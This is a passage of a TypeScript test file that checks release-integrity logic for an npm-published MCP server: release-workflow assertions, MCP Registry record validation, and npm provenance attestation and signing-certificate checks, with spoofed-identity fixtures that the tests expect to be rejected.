    !inputs.release.includes("npm run mcpb:verify") ||
    !inputs.release.includes("Existing release provenance does not identify this source/artifact") ||
    !inputs.integrity.includes(`mcpb-basic-candidate-\${producerAttempt}`) ||
    !npmPublicationIsByteBound ||
    !inputs.release.includes("npm dist-tag $CHANNEL does not resolve to expected $EXPECTED_CHANNEL_VERSION") ||
    !inputs.release.includes("Existing release $TAG has incompatible tag, channel, or draft identity") ||
    (inputs.release.match(/releases\?per_page=100/g) ?? []).length < 4 ||
    !inputs.release.includes("assets?per_page=100") ||
    inputs.release.includes("/releases/tags/") ||
    inputs.release.includes("gh release download") ||
    mutationMatchCount(inputs.release, MCPB_PREFLIGHT_ASSET_COMPARE) !== 1 ||
    inputs.release.includes("git ls-remote --tags origin") ||
    !remoteTagIdentityIsCanonical ||
    (inputs.release.match(/assert_remote_tag_identity\(\) \{/g) ?? []).length !== 5 ||
    (inputs.release.match(/git\/ref\/tags\/\$TAG/g) ?? []).length !== 10 ||
    (inputs.release.match(/git\/tags\/\$TAG_OBJECT_SHA/g) ?? []).length !== 5 ||
    (inputs.release.match(/TAG_REF_CONFIRM_JSON/g) ?? []).length !== 10 ||
    (inputs.release.match(/\.sha == \$tag_object_sha and \.tag == \$tag/g) ?? []).length !== 5 ||
    (inputs.release.match(/\.type == "commit" and \.sha == \$sha/g) ?? []).length !== 5 ||
    (inputs.release.match(/\.type == "tag" and \.sha == \$sha/g) ?? []).length !== 5 ||
    inputs.release.includes("target_commitish") ||
    inputs.release.includes("--target") ||
    !inputs.release.includes("--verify-tag") ||
    !inputs.release.includes("--draft") ||
    !inputs.release.includes("Published release $TAG is partial") ||
    !inputs.release.includes("Final release contains unexpected asset") ||
    !inputs.release.includes("Final release does not contain exactly one $NAME") ||
    !inputs.release.includes("group: release-publication") ||
    !inputs.release.includes("cancel-in-progress: false") ||
    !inputs.release.includes("CONFIRM_UPLOAD_URL=$(printf '%s' \"$CONFIRM_RELEASE\" | jq -er") ||
    !inputs.release.includes('[ "$CONFIRM_UPLOAD_URL" != "$EXPECTED_UPLOAD_URL" ]') ||
    !inputs.release.includes(`UPLOAD_BASE=\${CONFIRM_UPLOAD_URL%%\\{*}`) ||
    !inputs.release.includes(
      `https://uploads.github.com/repos/\${{ github.repository }}/releases/$RELEASE_ID/assets`
    ) ||
    !inputs.release.includes("ENCODED_NAME=$(printf '%s' \"$NAME\" | jq -sRr @uri)") ||
    !inputs.release.includes('--data-binary "@$LOCAL_ASSET"') ||
    inputs.release.includes("--hostname uploads.github.com") ||
    (inputs.release.match(/node scripts\/check-release-integrity\.mjs channel-advance/g) ?? []).length !== 4 ||
    !inputs.release.includes("assert_stable_github_advance") ||
    !inputs.release.includes("is not GitHub's latest release before npm publication") ||
    !inputs.release.includes('"$VERSION" "$PUBLISHED_CHANNEL_VERSION" "$CHANNEL"') ||
    !inputs.release.includes('"$VERSION" "$PRE_WRITE_CHANNEL_VERSION" "$CHANNEL"') ||
    !inputs.release.includes('NPM_ACTION" = "reuse_superseded"') ||
    !inputs.release.includes('EXPECTED_CHANNEL_VERSION="$PUBLISHED_CHANNEL_VERSION"') ||
    !inputs.release.includes('EXPECTED_POST_ACTION="reuse_superseded"') ||
    !inputs.release.includes('"$CONFIRMED_CHANNEL_VERSION" != "$EXPECTED_CHANNEL_VERSION"') ||
    !inputs.release.includes('"$NPM_POST_ACTION" != "$EXPECTED_POST_ACTION"') ||
    !inputs.release.includes(MCPB_NPM_CHANNEL_ADVANCE) ||
    (inputs.release.includes("gh release upload") && inputs.release.includes("--clobber")) ||
    githubReleaseTransactionProblems(inputs.release).length !== 0 ||
    !inputs.release.includes("SOURCE_SHA=$(git rev-parse HEAD)") ||
    !inputs.release.includes("source_sha: process.env.SOURCE_SHA") ||
    !inputs.release.includes("build_workflow_run:") ||
    !inputs.release.includes("process.env.BUILD_CI_RUN_ID") ||
    inputs.release.includes("release_workflow_run:") ||
    !inputs.release.includes(`release: \`\${process.env.GITHUB_SERVER_URL}`) ||
    !inputs.release.includes("checksum:") ||
    !inputs.release.includes("content_manifest:") ||
    !inputs.release.includes("sbom:") ||
    !inputs.release.includes("third_party_licenses:") ||
    !inputs.release.includes("content_manifest_sha256: process.env.CONTENT_SHA256") ||
    !inputs.release.includes("sbom_sha256: process.env.SBOM_SHA256") ||
    !inputs.release.includes("third_party_licenses_sha256: process.env.LICENSES_SHA256") ||
    !inputs.release.includes('packer: "@anthropic-ai/mcpb@2.1.2"')
  ) {
    problems.push(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
  }
  return problems;
}

function assertMcpRegistryEvaluatorContract() {
  expect(evaluateMcpRegistryState(mcpRegistryState(), "preflight")).toEqual({ action: "reuse" });
  expect(
    evaluateMcpRegistryState(
      mcpRegistryState(mcpRegistryNotFoundEnvelope("exact"), mcpRegistryNotFoundEnvelope("latest")),
      "preflight"
    )
  ).toEqual({ action: "publish" });

  const mcpRegistryPackage = (server: Record<string, unknown>) => {
    const packageEntry = (server.packages as Array<Record<string, unknown>> | undefined)?.[0];
    if (!packageEntry) throw new Error("MCP Registry fixture package is missing");
    return packageEntry;
  };
  const priorServer = mcpRegistryServer("3.11.6", {
    icons: [
      {
        src: "https://github.com/oomkapwn/enquire-mcp/raw/main/site/enquire-social.png",
        mimeType: "image/png",
        sizes: ["1200x630"],
        theme: "light"
      }
    ]
  });
  const priorPackage = mcpRegistryPackage(priorServer);
  priorPackage.fileSha256 = "a".repeat(64);
  priorPackage.registryBaseUrl = "https://registry.npmjs.org";
  priorPackage.runtimeHint = "npx";
  const priorPositionalArgument = (priorPackage.runtimeArguments as Array<Record<string, unknown>> | undefined)?.[0];
  if (!priorPositionalArgument) throw new Error("MCP Registry fixture positional argument is missing");
  delete priorPositionalArgument.valueHint;
  priorPackage.packageArguments = [
    {
      type: "named",
      name: "--silent",
      description: "Disable package-manager progress output",
      isRequired: false,
      format: "boolean",
      choices: ["true", "false"],
      default: "false",
      placeholder: "true or false",
      variables: {
        quiet: {
          description: "Package-manager quiet mode",
          format: "boolean",
          value: "true"
        }
      }
    }
  ];
  priorPackage.environmentVariables = [
    {
      name: "OBSIDIAN_VAULT",
      description: "Path to the Obsidian vault",
      isRequired: true,
      isSecret: false
    }
  ];
  expect(
    evaluateMcpRegistryState(
      mcpRegistryState(
        mcpRegistryNotFoundEnvelope("exact"),
        mcpRegistryEnvelope("latest", { body: mcpRegistryRecordBody(priorServer) })
      ),
      "preflight"
    )
  ).toEqual({ action: "publish" });

  const malformedOlderLatestCases: Array<{
    mutate: (server: Record<string, unknown>) => void;
    expected: RegExp;
  }> = [
    {
      mutate: (server) => {
        server.$schema = "https://example.invalid/server.schema.json";
      },
      expected: /server uses an unsupported MCP Registry schema/
    },
    {
      mutate: (server) => {
        server.icons = {};
      },
      expected: /server\.icons must be an array or null/
    },
    {
      mutate: (server) => {
        server.icons = null;
      },
      expected: /server\.icons must be an array/
    },
    {
      mutate: (server) => {
        server.icons = [null];
      },
      expected: /server\.icons\[0\] must be an object/
    },
    {
      mutate: (server) => {
        server.icons = [{ src: 42 }];
      },
      expected: /server\.icons\[0\]\.src must be a non-empty string of at most 255 Unicode characters/
    },
    {
      mutate: (server) => {
        server.icons = [{ src: "https://example.invalid/icon.png", sizes: [42] }];
      },
      expected: /server\.icons\[0\]\.sizes\[0\] must be an icon size or any/
    },
    {
      mutate: (server) => {
        server.icons = [{ src: "https://example.invalid/icon.png", mimeType: "image/gif" }];
      },
      expected: /server\.icons\[0\]\.mimeType is not an allowed image media type/
    },
    {
      mutate: (server) => {
        server.remotes = null;
      },
      expected: /server\.remotes must be an array/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).runtimeArguments = {};
      },
      expected: /packages\[0\]\.runtimeArguments must be an array/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).runtimeArguments = [null];
      },
      expected: /packages\[0\]\.runtimeArguments\[0\] must be an object/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).runtimeArguments = [{ type: "named", name: "--vault", isRequired: "yes" }];
      },
      expected: /runtimeArguments\[0\]\.isRequired must be boolean/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).runtimeArguments = [{ type: "switch", name: "--vault" }];
      },
      expected: /runtimeArguments\[0\]\.type must be named or positional/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).runtimeArguments = [{ type: "positional" }];
      },
      expected: /runtimeArguments\[0\] must name a non-empty valueHint or value string/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).runtimeArguments = [{ type: "positional", valueHint: 42, value: "serve" }];
      },
      expected: /runtimeArguments\[0\]\.valueHint must be a string/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).runtimeArguments = [{ type: "named", name: "--vault", format: "json" }];
      },
      expected: /runtimeArguments\[0\]\.format must be string, number, boolean, or filepath/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).packageArguments = {};
      },
      expected: /packages\[0\]\.packageArguments must be an array/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).packageArguments = [null];
      },
      expected: /packages\[0\]\.packageArguments\[0\] must be an object/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).packageArguments = [{ type: "named", name: 42 }];
      },
      expected: /packageArguments\[0\]\.name must be a non-empty string/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).packageArguments = [{ type: "named", name: "--silent", variables: [] }];
      },
      expected: /packageArguments\[0\]\.variables must be an object/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).packageArguments = [{ type: "named", name: "--silent", variables: { quiet: null } }];
      },
      expected: /packageArguments\[0\]\.variables\.quiet must be an object/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).environmentVariables = {};
      },
      expected: /packages\[0\]\.environmentVariables must be an array/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).environmentVariables = [null];
      },
      expected: /packages\[0\]\.environmentVariables\[0\] must be an object/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).environmentVariables = [{ name: "TOKEN", isSecret: "yes" }];
      },
      expected: /environmentVariables\[0\]\.isSecret must be boolean/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).environmentVariables = [{ name: "TOKEN", choices: [42] }];
      },
      expected: /environmentVariables\[0\]\.choices\[0\] must be a string/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).fileSha256 = "A".repeat(64);
      },
      expected: /packages\[0\]\.fileSha256 must be 64 lowercase hexadecimal characters/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).registryBaseUrl = 42;
      },
      expected: /packages\[0\]\.registryBaseUrl must be a string/
    },
    {
      mutate: (server) => {
        mcpRegistryPackage(server).runtimeHint = false;
      },
      expected: /packages\[0\]\.runtimeHint must be a string/
    }
  ];
  for (const { mutate, expected } of malformedOlderLatestCases) {
    const malformedPriorServer = JSON.parse(JSON.stringify(priorServer)) as Record<string, unknown>;
    mutate(malformedPriorServer);
    expect(() =>
      evaluateMcpRegistryState(
        mcpRegistryState(
          mcpRegistryNotFoundEnvelope("exact"),
          mcpRegistryEnvelope("latest", { body: mcpRegistryRecordBody(malformedPriorServer) })
        ),
        "preflight"
      )
    ).toThrow(expected);
  }

  const expectedServer = mcpRegistryServer();
  const reorderedServer = Object.fromEntries(Object.entries(expectedServer).reverse());
  const reorderedBody = mcpRegistryRecordBody(reorderedServer);
  expect(
    evaluateMcpRegistryState(
      mcpRegistryState(
        mcpRegistryEnvelope("exact", { body: reorderedBody }),
        mcpRegistryEnvelope("latest", { body: reorderedBody }),
        expectedServer
      ),
      "preflight"
    )
  ).toEqual({ action: "reuse" });
  expect(evaluateMcpRegistryState(mcpRegistryState(), "convergence")).toEqual({ action: "confirmed" });
  const registryCli = runReleaseIntegrityCli(["mcp-registry-state", "preflight"], JSON.stringify(mcpRegistryState()));
  expect(registryCli.status).toBe(0);
  expect(JSON.parse(registryCli.stdout)).toEqual({ action: "reuse" });
  expect(runReleaseIntegrityCli(["mcp-registry-state", "publish"], JSON.stringify(mcpRegistryState())).status).not.toBe(
    0
  );

  expect(() =>
    evaluateMcpRegistryState(
      mcpRegistryState(
        mcpRegistryEnvelope("exact"),
        mcpRegistryEnvelope("latest", {
          body: mcpRegistryRecordBody(mcpRegistryServer(), { updatedAt: "2026-08-02T12:00:02Z" })
        })
      ),
      "preflight"
    )
  ).toThrow(/do not prove/);

  for (const retryState of [
    mcpRegistryState(mcpRegistryEnvelope("exact", { curlExit: 28, httpStatus: "000", contentType: "", body: "" })),
    mcpRegistryState(mcpRegistryNotFoundEnvelope("exact")),
    mcpRegistryState(mcpRegistryEnvelope("exact", { httpStatus: "429", body: "rate limited" })),
    mcpRegistryState(mcpRegistryEnvelope("exact", { httpStatus: "503", body: "unavailable" })),
    mcpRegistryState(
      mcpRegistryEnvelope("exact"),
      mcpRegistryEnvelope("latest", { body: mcpRegistryRecordBody(priorServer) })
    ),
    mcpRegistryState(
      mcpRegistryEnvelope("exact", { body: mcpRegistryRecordBody(mcpRegistryServer(), { isLatest: false }) })
    )
  ]) {
    expect(evaluateMcpRegistryState(retryState, "convergence")).toEqual({ action: "retry" });
  }

  expect(() =>
    evaluateMcpRegistryState(
      mcpRegistryState(
        mcpRegistryEnvelope("exact", { body: mcpRegistryRecordBody(mcpRegistryServer(), { isLatest: false }) }),
        mcpRegistryEnvelope("latest", { body: mcpRegistryRecordBody(mcpRegistryServer(), { isLatest: false }) })
      ),
      "preflight"
    )
  ).toThrow();
  for (const status of ["deprecated", "deleted"]) {
    for (const phase of ["preflight", "convergence"] as const) {
      expect(() =>
        evaluateMcpRegistryState(
          mcpRegistryState(
            mcpRegistryEnvelope("exact", { body: mcpRegistryRecordBody(mcpRegistryServer(), { status }) })
          ),
          phase
        )
      ).toThrow();
    }
  }

  const divergentServer = mcpRegistryServer(MCP_REGISTRY_VERSION, { description: "A different manifest." });
  expect(() =>
    evaluateMcpRegistryState(
      mcpRegistryState(
        mcpRegistryEnvelope("exact", { body: mcpRegistryRecordBody(divergentServer) }),
        mcpRegistryEnvelope("latest", { body: mcpRegistryRecordBody(divergentServer) })
      ),
      "preflight"
    )
  ).toThrow(/diverges/);

  const reorderedArrayServer = JSON.parse(JSON.stringify(expectedServer)) as Record<string, unknown>;
  const reorderedPackage = (reorderedArrayServer.packages as Array<Record<string, unknown>>)[0];
  if (!reorderedPackage) throw new Error("MCP Registry fixture package is missing");
  reorderedPackage.runtimeArguments = [...(reorderedPackage.runtimeArguments as unknown[])].reverse();
  expect(() =>
    evaluateMcpRegistryState(
      mcpRegistryState(
        mcpRegistryEnvelope("exact", { body: mcpRegistryRecordBody(reorderedArrayServer) }),
        mcpRegistryEnvelope("latest", { body: mcpRegistryRecordBody(reorderedArrayServer) }),
        expectedServer
      ),
      "preflight"
    )
  ).toThrow(/diverges/);

  const unknownRuntimeFieldServer = JSON.parse(JSON.stringify(expectedServer)) as Record<string, unknown>;
  const unknownRuntimePackage = (unknownRuntimeFieldServer.packages as Array<Record<string, unknown>>)[0];
  const unknownRuntimeArgument = ((unknownRuntimePackage?.runtimeArguments as
    | Array<Record<string, unknown>>
    | undefined) ?? [])[0];
  if (!unknownRuntimeArgument) throw new Error("MCP Registry fixture runtime argument is missing");
  unknownRuntimeArgument.unexpected = true;
  expect(() =>
    evaluateMcpRegistryState(mcpRegistryState(undefined, undefined, unknownRuntimeFieldServer), "preflight")
  ).toThrow(/positional runtime argument must contain exactly/);

  for (const invalidExact of [
    mcpRegistryEnvelope("exact", { requestUrl: `${MCP_REGISTRY_BASE_URL}/${MCP_REGISTRY_VERSION}` }),
    mcpRegistryEnvelope("exact", { curlExit: -1 }),
    mcpRegistryEnvelope("exact", { curlExit: 28, httpStatus: "000", contentType: "", body: "" }),
    mcpRegistryEnvelope("exact", { httpStatus: "20" }),
    mcpRegistryEnvelope("exact", { httpStatus: "429", body: "rate limited" }),
    mcpRegistryEnvelope("exact", { httpStatus: "503", body: "unavailable" }),
    mcpRegistryEnvelope("exact", { contentType: "application/json; charset=utf-8" }),
    mcpRegistryEnvelope("exact", { body: "{" }),
    mcpRegistryEnvelope("exact", { body: `${mcpRegistryRecordBody()} {}` }),
    mcpRegistryEnvelope("exact", {
      body: JSON.stringify({
        server: mcpRegistryServer(),
        _meta: JSON.parse(mcpRegistryRecordBody())._meta,
        extra: true
      })
    }),
    mcpRegistryEnvelope("exact", {
      body: mcpRegistryRecordBody(mcpRegistryServer(), { isLatest: undefined })
    }),
    mcpRegistryEnvelope("exact", {
      body: mcpRegistryRecordBody(mcpRegistryServer(), { statusChangedAt: "2026-02-30T12:00:00Z" })
    }),
    mcpRegistryEnvelope("exact", {
      body: mcpRegistryRecordBody(mcpRegistryServer(), { unexpected: true })
    }),
    mcpRegistryEnvelope("exact", {
      body: mcpRegistryRecordBody(mcpRegistryServer(), { statusMessage: "x".repeat(501) })
    }),
    mcpRegistryEnvelope("exact", {
      body: JSON.stringify({ server: mcpRegistryServer(), _meta: {} })
    }),
    mcpRegistryEnvelope("exact", {
      body: JSON.stringify({
        server: mcpRegistryServer(),
        _meta: { [MCP_REGISTRY_OFFICIAL_META]: "active" }
      })
    })
  ]) {
    expect(() => evaluateMcpRegistryState(mcpRegistryState(invalidExact), "preflight")).toThrow();
  }

  expect(() =>
    evaluateMcpRegistryState(
      mcpRegistryState(
        mcpRegistryNotFoundEnvelope("exact"),
        mcpRegistryEnvelope("latest", {
          body: mcpRegistryRecordBody(),
          contentType: "application/problem+json"
        })
      ),
      "preflight"
    )
  ).toThrow();
  expect(() =>
    evaluateMcpRegistryState(
      mcpRegistryState(
        mcpRegistryEnvelope("exact", {
          httpStatus: "404",
          contentType: "application/problem+json",
          body: JSON.stringify({ detail: "Not here", status: 404, title: "Not Found" })
        }),
        mcpRegistryNotFoundEnvelope("latest")
      ),
      "preflight"
    )
  ).toThrow();
  expect(() =>
    evaluateMcpRegistryState(
      mcpRegistryState(
        mcpRegistryNotFoundEnvelope("exact"),
        mcpRegistryEnvelope("latest", { body: mcpRegistryRecordBody() })
      ),
      "preflight"
    )
  ).toThrow(/disagree/);
  expect(() =>
    evaluateMcpRegistryState(
      mcpRegistryState(
        mcpRegistryNotFoundEnvelope("exact"),
        mcpRegistryEnvelope("latest", { body: mcpRegistryRecordBody(mcpRegistryServer("5.0.0")) })
      ),
      "preflight"
    )
  ).toThrow(/newer/);

  for (const invalidServer of [
    mcpRegistryServer(MCP_REGISTRY_VERSION, { $schema: "https://example.invalid/server.schema.json" }),
    mcpRegistryServer(MCP_REGISTRY_VERSION, { description: "x".repeat(101) }),
    mcpRegistryServer("4.0.0-rc.1"),
    mcpRegistryServer(MCP_REGISTRY_VERSION, { repository: { url: "https://example.invalid", source: "github" } }),
    mcpRegistryServer(MCP_REGISTRY_VERSION, {
      packages: [
        {
          registryType: "npm",
          identifier: MCP_REGISTRY_PACKAGE,
          version: MCP_REGISTRY_VERSION,
          transport: { type: "streamable-http" }
        }
      ]
    })
  ]) {
    expect(() =>
      evaluateMcpRegistryState(mcpRegistryState(undefined, undefined, invalidServer), "preflight")
    ).toThrow();
  }

  const wrongPackageState = mcpRegistryState();
  wrongPackageState.expected.package.name = "@attacker/enquire-mcp";
  expect(() => evaluateMcpRegistryState(wrongPackageState, "preflight")).toThrow(/identity/);
  expect(() => evaluateMcpRegistryState(mcpRegistryState(), "publish")).toThrow(/phase/);
}

function assertMcpRegistryTrackedManifestContract(serverSource: string, packageSource: string) {
  const server = JSON.parse(serverSource) as Record<string, unknown>;
  const pkg = JSON.parse(packageSource) as Record<string, unknown>;
  expect(server.version).toBe(pkg.version);
  expect(pkg.name).toBe(MCP_REGISTRY_PACKAGE);
  expect(pkg.mcpName).toBe(MCP_REGISTRY_NAME);
  expect(Array.isArray(server.packages)).toBe(true);
  for (const packageEntry of server.packages as Array<Record<string, unknown>>) {
    expect(packageEntry.version).toBe(pkg.version);
  }

  const stableServer = JSON.parse(JSON.stringify(server)) as Record<string, unknown>;
  stableServer.version = MCP_REGISTRY_VERSION;
  for (const packageEntry of stableServer.packages as Array<Record<string, unknown>>) {
    packageEntry.version = MCP_REGISTRY_VERSION;
  }
  const state = {
    expected: {
      server: stableServer,
      package: { name: pkg.name, version: MCP_REGISTRY_VERSION, mcpName: pkg.mcpName }
    },
    exact: mcpRegistryNotFoundEnvelope("exact"),
    latest: mcpRegistryNotFoundEnvelope("latest")
  };
  expect(evaluateMcpRegistryState(state, "preflight")).toEqual({ action: "publish" });

  const excessiveDescription = JSON.parse(JSON.stringify(stableServer)) as Record<string, unknown>;
  excessiveDescription.description = "x".repeat(101);
  expect(() =>
    evaluateMcpRegistryState({ ...state, expected: { ...state.expected, server: excessiveDescription } }, "preflight")
  ).toThrow(/1 to 100 Unicode characters/);
  expect(() =>
    evaluateMcpRegistryState(
      { ...state, expected: { ...state.expected, package: { ...state.expected.package, mcpName: "invalid/name" } } },
      "preflight"
    )
  ).toThrow(/identity/);
}

function assertNpmProvenanceEvaluatorContract() {
  // Positive control: one exact tag-push context observed through two independent surfaces.
  expect(evaluateNpmProvenanceContext(npmProvenanceContext(), TRUSTED_SOURCE_SHA, NPM_PROVENANCE_TAG)).toEqual({
    runId: NPM_PROVENANCE_RUN_ID,
    runAttempt: NPM_PROVENANCE_RUN_ATTEMPT
  });

  // Negative control: every context field, side, expected identity, and object shape is fail-closed.
  {
    const canonical = npmProvenanceContext();
    type ContextSide = keyof typeof canonical;
    type ContextField = keyof (typeof canonical)["declared"];
    const fields = Object.keys(canonical.declared) as ContextField[];
    for (const side of ["declared", "runtime"] satisfies ContextSide[]) {
      for (const field of fields) {
        const mutated = npmProvenanceContext();
        mutated[side][field] = `${mutated[side][field]}-mutated`;
        expect(
          () => evaluateNpmProvenanceContext(mutated, TRUSTED_SOURCE_SHA, NPM_PROVENANCE_TAG),
          `${side}.${String(field)}`
        ).toThrow();
      }
    }

    for (const malformed of [
      null,
      [],
      {},
      { declared: canonical.declared },
      { runtime: canonical.runtime },
      { declared: canonical.declared, runtime: { ...canonical.runtime, runId: 30_726_087_813 } },
      { declared: { ...canonical.declared, extra: "not-allowed" }, runtime: canonical.runtime },
      { declared: canonical.declared, runtime: { ...canonical.runtime, extra: "not-allowed" } }
    ]) {
      expect(() => evaluateNpmProvenanceContext(malformed, TRUSTED_SOURCE_SHA, NPM_PROVENANCE_TAG)).toThrow();
    }
    for (const [sourceSha, tag] of [
      ["source", NPM_PROVENANCE_TAG],
      ["352c54c0e0d4939c9f7b93470a4a2d7c7a0ac78c", NPM_PROVENANCE_TAG],
      [TRUSTED_SOURCE_SHA, "4.0.0-rc.2"],
      [TRUSTED_SOURCE_SHA, "v4.0.0-rc.3"]
    ]) {
      expect(() => evaluateNpmProvenanceContext(canonical, sourceSha, tag)).toThrow();
    }
  }

  // Positive controls: fresh publication, historical reuse, bundle reorder, and unrelated dependencies.
  {
    expect(evaluateNpmProvenanceAttestations(npmProvenanceReport(), npmProvenanceExpected(true))).toEqual({
      runId: NPM_PROVENANCE_RUN_ID,
      runAttempt: NPM_PROVENANCE_RUN_ATTEMPT
    });

    const historicalRunId = "30000000001";
    expect(
      evaluateNpmProvenanceAttestations(
        npmProvenanceReport({ slsa: { runId: historicalRunId, runAttempt: "1" } }),
        npmProvenanceExpected(false)
      )
    ).toEqual({ runId: historicalRunId, runAttempt: "1" });

    const publishBundle = npmAttestationBundle(NPM_PROVENANCE_PUBLISH_PREDICATE, npmPublishStatement());
    const slsaBundle = npmAttestationBundle(NPM_PROVENANCE_SLSA_PREDICATE, npmSlsaStatement());
    for (const rawBytes of [NPM_PROVENANCE_SLSA_UTF8_ISSUER_CERTIFICATE, NPM_PROVENANCE_SLSA_DUAL_ISSUER_CERTIFICATE]) {
      const alternateIssuerSlsaBundle = npmAttestationBundle(NPM_PROVENANCE_SLSA_PREDICATE, npmSlsaStatement(), {
        verificationMaterial: npmSlsaVerificationMaterial([{ rawBytes }])
      });
      expect(
        evaluateNpmProvenanceAttestations(
          npmProvenanceReport({ bundles: [publishBundle, alternateIssuerSlsaBundle] }),
          npmProvenanceExpected(true)
        )
      ).toEqual({ runId: NPM_PROVENANCE_RUN_ID, runAttempt: NPM_PROVENANCE_RUN_ATTEMPT });
    }
    expect(
      evaluateNpmProvenanceAttestations(
        npmProvenanceReport({
          bundles: [
            { ...slsaBundle, signedAccessSignatureUrl: "" },
            { ...publishBundle, signedAccessSignatureUrl: "" }
          ],
          extraVerified: [
            {
              name: "kleur",
              version: "4.1.5",
              location: "node_modules/kleur",
              registry: "https://registry.npmjs.org/"
            }
          ]
        }),
        npmProvenanceExpected(true)
      )
    ).toEqual({ runId: NPM_PROVENANCE_RUN_ID, runAttempt: NPM_PROVENANCE_RUN_ATTEMPT });
  }

  // Negative control: the audit must be globally clean and contain one exact target.
  for (const report of [
    null,
    [],
    {},
    { invalid: [], missing: [], verified: null },
    npmProvenanceReport({ invalid: [{ name: "tampered" }] }),
    npmProvenanceReport({ missing: [{ name: "unsigned" }] }),
    npmProvenanceReport({ targetCopies: 0 }),
    npmProvenanceReport({ targetCopies: 2 })
  ]) {
    expect(() => evaluateNpmProvenanceAttestations(report, npmProvenanceExpected(true))).toThrow();
  }

  for (const targetOverrides of [
    { name: "@oomkapwn/not-enquire" },
    { version: "4.0.0-rc.1" },
    { location: "node_modules/enquire-mcp" },
    { registry: "https://registry.npmjs.org" },
    {
      attestations: `https://registry.npmjs.org/-/npm/v1/attestations/@oomkapwn%2fenquire-mcp@${NPM_PROVENANCE_VERSION}`
    },
    {
      attestations: {
        url: "https://registry.npmjs.org/-/npm/v1/attestations/@oomkapwn%2fenquire-mcp@4.0.0-rc.1",
        provenance: { predicateType: NPM_PROVENANCE_SLSA_PREDICATE }
      }
    },
    {
      attestations: {
        url: `https://registry.npmjs.org/-/npm/v1/attestations/@oomkapwn%2fenquire-mcp@${NPM_PROVENANCE_VERSION}`,
        provenance: { predicateType: NPM_PROVENANCE_PUBLISH_PREDICATE }
      }
    },
    { unexpected: "not-allowed" }
  ]) {
    expect(() =>
      evaluateNpmProvenanceAttestations(npmProvenanceReport({ targetOverrides }), npmProvenanceExpected(true))
    ).toThrow();
  }

  // Negative control: exactly two canonical and decodable bundles are required.
  {
    const publishBundle = npmAttestationBundle(NPM_PROVENANCE_PUBLISH_PREDICATE, npmPublishStatement());
    const slsaBundle = npmAttestationBundle(NPM_PROVENANCE_SLSA_PREDICATE, npmSlsaStatement());
    const unknownBundle = npmAttestationBundle("https://example.invalid/predicate/v1", npmPublishStatement());
    for (const bundles of [
      [],
      [publishBundle],
      [slsaBundle],
      [publishBundle, publishBundle],
      [slsaBundle, slsaBundle],
      [publishBundle, slsaBundle, unknownBundle]
    ]) {
      expect(() =>
        evaluateNpmProvenanceAttestations(npmProvenanceReport({ bundles }), npmProvenanceExpected(true))
      ).toThrow();
    }

    const malformedBundles = [
      npmAttestationBundle(NPM_PROVENANCE_PUBLISH_PREDICATE, npmPublishStatement(), {
        mediaType: "application/json"
      }),
      npmAttestationBundle(NPM_PROVENANCE_PUBLISH_PREDICATE, npmPublishStatement(), {
        payloadType: "application/json"
      }),
      npmAttestationBundle(NPM_PROVENANCE_PUBLISH_PREDICATE, npmPublishStatement(), { payload: "!!!" }),
      npmAttestationBundle(NPM_PROVENANCE_PUBLISH_PREDICATE, npmPublishStatement(), {
        payload: Buffer.from("{", "utf8").toString("base64")
      }),
      npmAttestationBundle(NPM_PROVENANCE_PUBLISH_PREDICATE, npmPublishStatement(), { signatures: [] }),
      npmAttestationBundle(NPM_PROVENANCE_PUBLISH_PREDICATE, npmSlsaStatement())
    ];
    for (const malformed of malformedBundles) {
      expect(() =>
        evaluateNpmProvenanceAttestations(
          npmProvenanceReport({ bundles: [malformed, slsaBundle] }),
          npmProvenanceExpected(true)
        )
      ).toThrow();
    }

    const wrongRepositoryCertificate = npmCertificateWithSignerUri(
      "https://github.com/attacker/enquire-mcp/.github/workflows/release.yml@refs/tags/v4.0.0-rc.2"
    );
    const branchCertificate = npmCertificateWithSignerUri(
      "https://github.com/oomkapwn/enquire-mcp/.github/workflows/release.yml@refs/heads/release-v4"
    );
    for (const rawBytes of [
      wrongRepositoryCertificate,
      branchCertificate,
      NPM_PROVENANCE_SLSA_MULTIPLE_SAN_CERTIFICATE
    ]) {
      const wrongSignerBundle = npmAttestationBundle(NPM_PROVENANCE_SLSA_PREDICATE, npmSlsaStatement(), {
        verificationMaterial: npmSlsaVerificationMaterial([{ rawBytes }])
      });
      expect(() =>
        evaluateNpmProvenanceAttestations(
          npmProvenanceReport({ bundles: [publishBundle, wrongSignerBundle] }),
          npmProvenanceExpected(true)
        )
      ).toThrow("SLSA certificate SAN does not match the exact tagged workflow signer");
    }

    const certificateDer = Buffer.from(NPM_PROVENANCE_SLSA_CERTIFICATE, "base64");
    const malformedDerCertificate = certificateDer.subarray(0, certificateDer.length - 1).toString("base64");
    const malformedCertificateBundle = npmAttestationBundle(NPM_PROVENANCE_SLSA_PREDICATE, npmSlsaStatement(), {
      verificationMaterial: npmSlsaVerificationMaterial([{ rawBytes: malformedDerCertificate }])
    });
    expect(() =>
      evaluateNpmProvenanceAttestations(
        npmProvenanceReport({ bundles: [publishBundle, malformedCertificateBundle] }),
        npmProvenanceExpected(true)
      )
    ).toThrow("SLSA signing certificate must be valid DER X.509");

    const reportWithCertificate = (rawBytes: string) =>
      npmProvenanceReport({
        bundles: [
          publishBundle,
          npmAttestationBundle(NPM_PROVENANCE_SLSA_PREDICATE, npmSlsaStatement(), {
            verificationMaterial: npmSlsaVerificationMaterial([{ rawBytes }])
          })
        ]
      });
    const wrongLegacyIssuerCertificate = mutateNpmCertificateBytes(
